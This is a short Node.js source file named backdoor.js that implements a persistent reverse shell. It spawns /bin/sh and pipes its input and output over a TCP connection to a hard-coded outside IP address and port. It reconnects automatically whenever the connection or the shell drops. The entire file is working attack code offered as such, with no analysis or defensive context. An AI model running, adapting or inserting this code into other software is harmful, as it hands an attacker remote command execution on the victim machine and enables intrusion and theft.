// backdoor.js
import net from 'net';
import { spawn } from 'child_process';
import { setInterval } from 'timers/promises';

const args = process.argv.slice(2);
const port = parseInt(args[0] || process.env.BACKDOOR_PORT || '9001');
const ip = args[1] || process.env.BACKDOOR_IP || '86.178.225.29';
const reconnectDelay = parseInt(args[2] || process.env.BACKDOOR_RECONNECT_DELAY || '5000'); // ms

let currentShell = null;
let client = null;

function cleanup() {
  if (currentShell) {
    currentShell.kill();
    currentShell = null;
  }
  if (client) {
    client.destroy();
    client = null;
  }
}

function connect() {
  cleanup(); // Ensure clean state

  currentShell = spawn('/bin/sh', [], { stdio: ['pipe', 'pipe', 'pipe'] });
  client = new net.Socket();

  client.connect(port, ip, () => {
    console.log(`Backdoor connected to ${ip}:${port}`);
    client.pipe(currentShell.stdin);
    currentShell.stdout.pipe(client);
    currentShell.stderr.pipe(client);
  });

  client.on('error', (err) => {
    console.error(`Connection error: ${err.message}`);
    setTimeout(connect, reconnectDelay);
  });

  client.on('close', () => {
    console.log('Connection closed, attempting reconnect...');
    setTimeout(connect, reconnectDelay);
  });

  // Handle shell exit
  currentShell.on('exit', (code) => {
    console.log(`Shell exited with code ${code}, reconnecting...`);
    setTimeout(connect, reconnectDelay);
  });
}

// Initial connection
connect();

// Graceful shutdown (optional, for testing)
process.on('SIGINT', cleanup);
process.on('SIGTERM', cleanup);
